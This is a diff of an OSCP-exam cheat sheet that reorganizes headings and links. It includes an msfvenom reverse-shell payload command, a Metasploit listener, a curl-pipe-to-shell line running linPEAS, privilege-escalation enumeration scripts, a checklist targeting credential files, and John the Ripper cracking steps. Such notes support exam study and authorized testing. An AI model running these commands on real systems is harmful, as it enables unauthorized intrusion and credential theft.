@@ -40,17 +40,22 @@
   - [GIT](#git)
   - [HASHES](#hashes)
   - [MIMIKATZ](#mimikatz)
-  - [MISCELLANEOUS](#miscellaneous)
   - [MSFVENOM PAYLOAD](#msfvenom-payload)
   - [Multihandler Listener](#multihandler-listener)
   - [PASSWORD CRACKING](#password-cracking)
   - [PIVOTING](#pivoting)
   - [LINUX PRIVILEGE ESCALATION](#linux-privilege-escalation)
+    - [LPrivEsc Courses](#lprivesc-courses)
+    - [PrivEsc Cheatsheets/Scripts](#privesc-cheatsheetsscripts)
+      - [Attacks](#attacks)
+      - [Vulnerability scan](#vulnerability-scan)
+      - [Suid checker](#suid-checker)
+      - [Methodology to follow](#methodology-to-follow)
     - [Linux Priv Esc troubleshooting](#linux-priv-esc-troubleshooting)
     - [Linux Troubleshooting](#linux-troubleshooting)
   - [WINDOWS PRIVILEGE ESCALATION](#windows-privilege-escalation)
     - [PrivEsc Resources](#privesc-resources)
-      - [Attacks](#attacks)
+      - [Attacks](#attacks-1)
       - [Enumeration scripts](#enumeration-scripts)
       - [Search for CVE](#search-for-cve)
       - [Post exploitation](#post-exploitation)
@@ -70,6 +75,7 @@
   - [USEFUL LINUX COMMANDS](#useful-linux-commands)
   - [USEFUL WINDOWS COMMANDS](#useful-windows-commands)
   - [ZIP](#zip)
+  - [MISCELLANEOUS](#miscellaneous)
 
 ## OSCP SubReddit
 - [OSCP Reddit!](https://www.reddit.com/r/oscp)
@@ -1053,21 +1059,14 @@
   lsadump::cache
   ```
 
-## MISCELLANEOUS
-- Get a Windows path without spaces
-  - path.cmd
-    - 
-      ```
-      @echo off
-      echo %~s1
-      ```
-
-  - `path.cmd "C:\Program Files (x86)\Common Files\test.txt"`
-  - C:\PROGRA~2\COMMON~1\test.txt -> Valid path without spaces
-
 
 ## MSFVENOM PAYLOAD
-- [MSFVEMON CheatSheet](https://netsec.ws/?p=331)
+- [MSFVEMON CheatSheet netsec](https://netsec.ws/?p=331)
+- [MSFVEMON CheatSheet hacktricks](https://book.hacktricks.xyz/shells/shells/untitled)
+- [MSFVEMON CheatSheet rapid7](https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675)
+- [MSFVEMON CheatSheet thor-sec](https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/)
+- [MSFVEMON CheatSheet security-geek](http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/)
+- [MSFVEMON CheatSheet frizb](https://github.com/frizb/MSF-Venom-Cheatsheet)
 - Linux
   - `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf`
 - Windows
@@ -1139,12 +1138,6 @@ msf>exploit -j
 The -j option is to keep all the connected session in the background.  
 
 
-- References
-  - <https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675>
-  - <https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/>
-  - <http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/>
-  - <https://github.com/frizb/MSF-Venom-Cheatsheet>
-
 - Listener
   - Metasploit
     - `use exploit/multi/handler`
@@ -1188,65 +1181,65 @@ The -j option is to keep all the connected session in the background.
 
 
 ## LINUX PRIVILEGE ESCALATION
-- PrivEsc Courses
-  - [PrivEsc Strategy](https://www.youtube.com/watch?v=VpNaPAh93vE)
-  - [Linux Privilege Escalation for OSCP & Beyond! = Tib3rius](https://www.udemy.com/course/linux-privilege-escalation/)
-  - [Linux Privilege Escalation for Beginners - TCM](https://www.udemy.com/course/linux-privilege-escalation-for-beginners/)
+### LPrivEsc Courses
+- [PrivEsc Strategy](https://www.youtube.com/watch?v=VpNaPAh93vE)
+- [Linux Privilege Escalation for OSCP & Beyond! = Tib3rius](https://www.udemy.com/course/linux-privilege-escalation/)
+- [Linux Privilege Escalation for Beginners - TCM](https://www.udemy.com/course/linux-privilege-escalation-for-beginners/)
 
-- PrivEsc Cheatsheets/Scripts
-  - [Linux privilege escalation (enumeration) script - LinEnum.sh](https://github.com/rebootuser/LinEnum)
-  - [Abusing SUDO (Linux Privilege Escalation)](https://touhidshaikh.com/blog/2018/04/11/abusing-sudo-linux-privilege-escalation/)
-  - [Scripts - PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
-  - [GTFOBins](https://gtfobins.github.io/)
-  - [g0tmi1k - basic-linux-privilege-escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
-  - [sushant747 - privilege_escalation_-_linux](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)
-  - [hacktricks - linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
-  - [swisskyrepo - privilege_escalation_Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
-  - [lucyoa - kernel-exploits](https://github.com/lucyoa/kernel-exploits)
-  - [Linux Privilege Escalation: Automated Script](https://www.hackingarticles.in/linux-privilege-escalation-automated-script/)
+### PrivEsc Cheatsheets/Scripts
+- [Linux privilege escalation (enumeration) script - LinEnum.sh](https://github.com/rebootuser/LinEnum)
+- [Abusing SUDO (Linux Privilege Escalation)](https://touhidshaikh.com/blog/2018/04/11/abusing-sudo-linux-privilege-escalation/)
+- [Scripts - PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
+- [GTFOBins](https://gtfobins.github.io/)
+- [g0tmi1k - basic-linux-privilege-escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+- [sushant747 - privilege_escalation_-_linux](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)
+- [hacktricks - linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
+- [swisskyrepo - privilege_escalation_Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
+- [lucyoa - kernel-exploits](https://github.com/lucyoa/kernel-exploits)
+- [Linux Privilege Escalation: Automated Script](https://www.hackingarticles.in/linux-privilege-escalation-automated-script/)
 
-- Attacks
-  - Enumeration scripts
-    - `bash LinEnum.sh`
-    - `bash lse.sh -l 1`
-    - `bash linpeas.sh`
-    - `python linuxprivchecker.py`
-    - `./unix-privesc-check standard`
-    - `curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh`
+#### Attacks
+- Enumeration scripts
+  - `bash LinEnum.sh`
+  - `bash lse.sh -l 1`
+  - `bash linpeas.sh`
+  - `python linuxprivchecker.py`
+  - `./unix-privesc-check standard`
+  - `curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh`
 
-- Vulnerability scan
-  - `perl les2.pl`
-  - `bash les.sh`
+#### Vulnerability scan
+- `perl les2.pl`
+- `bash les.sh`
 
-- Suid checker
-  - `python suid3num.py`
-  - <https://gtfobins.github.io/>
+#### Suid checker
+- `python suid3num.py`
+- <https://gtfobins.github.io/>
 
-- Methodology to follow
-  - <https://guif.re/linuxeop>
-  - <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md>
-  - 
-    ```
-    sudo -l
-    Kernel Exploits
-    OS Exploits
-    Password reuse (mysql, .bash_history, 000- default.conf...)
-    Known binaries with suid flag and interactive (nmap)
-    Custom binaries with suid flag either using other binaries or with command execution
-    Writable files owned by root that get executed (cronjobs)
-    MySQL as root
-    Vulnerable services (chkrootkit, logrotate)
-    Writable /etc/passwd
-    Readable .bash_history
-    SSH private key
-    Listening ports on localhost
-    /etc/fstab
-    /etc/exports
-    /var/mail
-    Process as other user (root) executing something you have permissions to modify
-    SSH public key + Predictable PRNG
-    apt update hooking (PreInvoke)
-    ```
+#### Methodology to follow
+- <https://guif.re/linuxeop>
+- <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md>
+- 
+  ```
+  sudo -l
+  Kernel Exploits
+  OS Exploits
+  Password reuse (mysql, .bash_history, 000- default.conf...)
+  Known binaries with suid flag and interactive (nmap)
+  Custom binaries with suid flag either using other binaries or with command execution
+  Writable files owned by root that get executed (cronjobs)
+  MySQL as root
+  Vulnerable services (chkrootkit, logrotate)
+  Writable /etc/passwd
+  Readable .bash_history
+  SSH private key
+  Listening ports on localhost
+  /etc/fstab
+  /etc/exports
+  /var/mail
+  Process as other user (root) executing something you have permissions to modify
+  SSH public key + Predictable PRNG
+  apt update hooking (PreInvoke)
+  ```
 
 
 ### Linux Priv Esc troubleshooting
@@ -1926,3 +1919,14 @@ The -j option is to keep all the connected session in the background.
 - `zip2john file.zip > zip.john`
 - `john --wordlist=<PASSWORDS_LIST> zip.john`
 
+## MISCELLANEOUS
+- Get a Windows path without spaces
+  - path.cmd
+    - 
+      ```
+      @echo off
+      echo %~s1
+      ```
+
+  - `path.cmd "C:\Program Files (x86)\Common Files\test.txt"`
+  - C:\PROGRA~2\COMMON~1\test.txt -> Valid path without spaces
